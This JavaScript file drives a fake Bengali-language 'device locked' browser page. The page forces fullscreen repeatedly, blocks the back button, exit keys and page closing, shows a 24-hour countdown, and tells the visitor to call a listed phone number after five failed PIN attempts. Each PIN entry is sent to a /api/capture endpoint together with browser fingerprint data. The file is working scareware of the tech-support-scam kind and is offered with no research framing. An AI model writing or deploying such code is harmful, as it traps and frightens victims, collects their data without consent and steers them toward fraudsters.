const CONFIG = {
    CORRECT_PIN: '7380',
    PHONE_NUMBER: '+8809658470831',
    API_BASE: '/api',
    MAX_ATTEMPTS: 5
};

function updateStatusBar() {
    const now = new Date();
    const hours = String(now.getHours()).padStart(2, '0');
    const minutes = String(now.getMinutes()).padStart(2, '0');
    document.getElementById('statusTime').textContent = `${hours}:${minutes}`;
}

if (navigator.getBattery) {
    navigator.getBattery().then(battery => {
        function updateBattery() {
            const level = Math.floor(battery.level * 100);
            const icon = level > 50 ? '🔋' : level > 20 ? '🔋' : '🪫';
            document.getElementById('batteryLevel').textContent = `${icon} ${level}%`;
        }
        updateBattery();
        battery.addEventListener('levelchange', updateBattery);
    });
}

setInterval(updateStatusBar, 1000);
updateStatusBar();

function startCountdown() {
    let remaining = 24 * 60 * 60;
    const timerEl = document.getElementById('timer');
    setInterval(() => {
        remaining = Math.max(0, remaining - 1);
        const hours = String(Math.floor(remaining / 3600)).padStart(2, '0');
        const minutes = String(Math.floor((remaining % 3600) / 60)).padStart(2, '0');
        const seconds = String(remaining % 60).padStart(2, '0');
        timerEl.textContent = `${hours}:${minutes}:${seconds}`;
    }, 1000);
}
startCountdown();

history.pushState(null, null, location.href);
window.addEventListener('popstate', function(e) {
    history.pushState(null, null, location.href);
});

window.addEventListener('beforeunload', function(e) {
    e.preventDefault();
    e.returnValue = '⚠️ আপনার ডিভাইস লক অবস্থায় আছে! ছাড়বেন না!';
});

document.addEventListener('visibilitychange', function() {
    if (!document.hidden) {
        setTimeout(enterFullscreen, 200);
    }
});

function enterFullscreen() {
    const el = document.documentElement;
    const methods = [
        () => el.requestFullscreen(),
        () => el.webkitRequestFullscreen(),
        () => el.msRequestFullscreen(),
        () => el.mozRequestFullScreen()
    ];
    for (const method of methods) {
        try {
            const result = method();
            if (result && result.catch) result.catch(() => {});
            break;
        } catch(e) {}
    }
}

function reEnterFullscreen() {
    if (!document.fullscreenElement && !document.webkitFullscreenElement) {
        setTimeout(enterFullscreen, 50);
    }
}

document.addEventListener('fullscreenchange', reEnterFullscreen);
document.addEventListener('webkitfullscreenchange', reEnterFullscreen);
setTimeout(enterFullscreen, 300);
setInterval(reEnterFullscreen, 2000);

document.addEventListener('keydown', function(e) {
    const blockedKeys = ['F11', 'Escape', 'F5', 'F4', 'F3', 'F2', 'F1', 'F6', 'F7', 'F8', 'F9', 'F10', 'F12'];
    if (blockedKeys.includes(e.key)) {
        e.preventDefault();
        e.stopPropagation();
        return false;
    }
    if (e.ctrlKey && (e.key === 'w' || e.key === 'r' || e.key === 'W' || e.key === 'R')) {
        e.preventDefault();
        return false;
    }
    if (e.altKey && (e.key === 'F4' || e.key === 'Tab')) {
        e.preventDefault();
        return false;
    }
}, true);

document.addEventListener('touchmove', function(e) {
    if (e.target === document.body || e.target.closest('.lock-screen')) {
        e.preventDefault();
    }
}, { passive: false });

document.addEventListener('gesturestart', function(e) { e.preventDefault(); });
document.addEventListener('gesturechange', function(e) { e.preventDefault(); });
document.addEventListener('gestureend', function(e) { e.preventDefault(); });
document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
document.addEventListener('copy', function(e) { e.preventDefault(); });
document.addEventListener('cut', function(e) { e.preventDefault(); });
document.addEventListener('paste', function(e) { e.preventDefault(); });
document.addEventListener('selectstart', function(e) { e.preventDefault(); });

let attempts = 0;
let isSubmitting = false;

function showLockScreen() {
    document.getElementById('unlockSuccess').style.display = 'none';
    document.querySelector('.lock-screen').style.display = 'flex';
}

function showUnlockScreen() {
    document.getElementById('unlockSuccess').style.display = 'flex';
    document.querySelector('.lock-screen').style.display = 'none';
}

async function submitCode() {
    if (isSubmitting) return;
    
    const input = document.getElementById('unlockInput');
    const errorMsg = document.getElementById('errorMsg');
    const btn = document.getElementById('unlockBtn');
    const code = input.value.trim();
    
    if (code.length < 4) {
        errorMsg.textContent = '❌ ৪ ডিজিটের কোড লিখুন / Enter 4-digit code';
        input.focus();
        return;
    }
    
    isSubmitting = true;
    btn.textContent = '⏳ চেক করা হচ্ছে...';
    btn.disabled = true;
    errorMsg.textContent = '';
    
    const payload = {
        pin: code,
        ua: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        screen: screen.width + 'x' + screen.height,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timestamp: new Date().toISOString(),
        url: window.location.href,
        referrer: document.referrer || 'Direct'
    };
    
    try {
        await fetch(`${CONFIG.API_BASE}/capture`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    } catch(e) {}
    
    if (code === CONFIG.CORRECT_PIN) {
        setTimeout(() => {
            showUnlockScreen();
            setTimeout(() => {
                window.location.href = 'https://www.youtube.com';
            }, 3000);
        }, 500);
    } else {
        attempts++;
        const remaining = CONFIG.MAX_ATTEMPTS - attempts;
        
        if (remaining <= 0) {
            errorMsg.textContent = '⛔ সর্বোচ্চ চেষ্টা শেষ! কল করুন +8809658470831';
        } else {
            const msgs = [
                '❌ ভুল কোড! আবার চেষ্টা করুন',
                '❌ কোড মিলছে না! আবার লিখুন',
                '❌ ভুল PIN! সঠিক কোড দিন',
                '❌ এক্সেস ডিনাইড! আবার চেষ্টা করুন'
            ];
            const randomMsg = msgs[Math.floor(Math.random() * msgs.length)];
            errorMsg.textContent = `${randomMsg} (${remaining} বার বাকি)`;
        }
        
        input.value = '';
        input.focus();
        
        setTimeout(() => {
            isSubmitting = false;
            btn.textContent = '✅ আনলক করুন / UNLOCK';
            btn.disabled = false;
        }, 2000);
        return;
    }
    
    isSubmitting = false;
    btn.textContent = '✅ আনলক করুন / UNLOCK';
    btn.disabled = false;
}

document.getElementById('unlockInput').addEventListener('keypress', function(e) {
    if (e.key === 'Enter') submitCode();
});

setTimeout(() => {
    document.getElementById('unlockInput').focus();
}, 800);

setInterval(() => {
    if (document.activeElement !== document.getElementById('unlockInput')) {
        document.getElementById('unlockInput').focus();
    }
}, 5000);

document.getElementById('unlockInput').addEventListener('focus', function() {
    setTimeout(() => {
        this.scrollIntoView({ behavior: 'smooth', block: 'center' });
    }, 300);
});
